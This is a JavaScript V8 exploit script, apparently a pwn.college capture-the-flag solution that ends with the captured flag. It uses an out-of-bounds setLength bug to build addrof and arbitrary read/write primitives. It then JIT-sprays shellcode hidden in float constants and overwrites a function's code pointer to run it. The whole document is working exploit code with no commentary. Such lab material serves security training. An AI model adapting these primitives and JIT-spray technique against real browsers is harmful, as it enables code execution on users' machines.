var f64 = new Float64Array(1);
var bigUint64 = new BigUint64Array(f64.buffer);
var u32 = new Uint32Array(f64.buffer);

function hex(i) {
    return i.toString(16).padStart(8, "0");
}

function i2f(i) {
    bigUint64[0] = i;
    return f64[0];
}

function f2i(i) {
    f64[0] = i;
    return bigUint64[0];
}

function u2f(low, high) {
    u32[0] = low;
    u32[1] = high;
    return f64[0];
}

function u2i(low, high) {
    u32[0] = low;
    u32[1] = high;
    return bigUint64[0];
}

function i2u_l(i) {
    bigUint64[0] = i;
    return u32[0];
}

function i2u_h(i) {
    bigUint64[0] = i;
    return u32[1];
}

const logInfo = (m) => console.log(`[*] ${m}`);
const logOK = (m) => console.log(`[+] ${m}`);
const logErr = (m) => console.log(`[-] ${m}`);

function toHex(x, w = 16) {
    x = BigInt.asUintN(64, BigInt(x));
    return "0x" + x.toString(16).padStart(w, "0");
}

function AddrOf(target) {
    obj[0] = target;
    b[0x100] = u2f(double_array_map, double_prototype);
    return i2u_l(f2i(obj[0]));
}

function ArbRead(addr) {
    b[0x100] = u2f(double_array_map, double_prototype);
    b[0x101] = u2f(addr - 0x8 + 1, 100);
    return f2i(obj[0]);
}

function ArbWrite(addr, value) {
    b[0x100] = u2f(double_array_map, double_prototype);
    b[0x101] = u2f(addr - 0x8 + 1, 100);
    obj[0] = i2f(value);
}

const shellcode = () => {
    return [
        1.9995716422075807e-246,
        1.9710255944286777e-246,
        1.97118242283721e-246,
        1.971136949489835e-246,
        1.9711826272869888e-246,
        1.9711829003383248e-246,
        -9.254983612527998e+61
    ];
}

for (let i = 0; i < 10000; i++) {
    shellcode();
}

let a = new Array(0x100).fill(1.1)
let b = new Array(0x100).fill(2.2);
let obj = { a, b };

// Get out of bounds
{
    a.setLength(0x110);
    b.setLength(0x110);
}

let double_array_map = i2u_l(f2i(a[0x100]));
let double_prototype = i2u_h(f2i(a[0x100]));
let double_element = i2u_l(f2i(a[0x101]));

logInfo("double_array_map: " + toHex(double_array_map));
logInfo("double_prototype: " + toHex(double_prototype));
logInfo("double_element: " + toHex(double_element));

// %DebugPrint(shellcode);

let shellcode_addr = AddrOf(shellcode) - 1;
logOK("shellcode addr: " + toHex(shellcode_addr));

let code_ptr = i2u_l(ArbRead(shellcode_addr + 0xc)) - 1;
logOK("code ptr: " + toHex(code_ptr));

let rwx_addr = ArbRead(code_ptr + 0x14);
logOK("rwx addr: " + toHex(rwx_addr));

let shellcode_start = rwx_addr + 0x69n + 0x2n;
logInfo("shellcode start at: " + toHex(shellcode_start));

logInfo("Overwrite code ptr to shellcode");
ArbWrite(code_ptr + 0x14, shellcode_start);

// %SystemBreak();
shellcode();
// pwn.college{0USCKAJqqRA8tuNqTu7jHhhjCWe.ddTO3UDL1MTNzYzW}
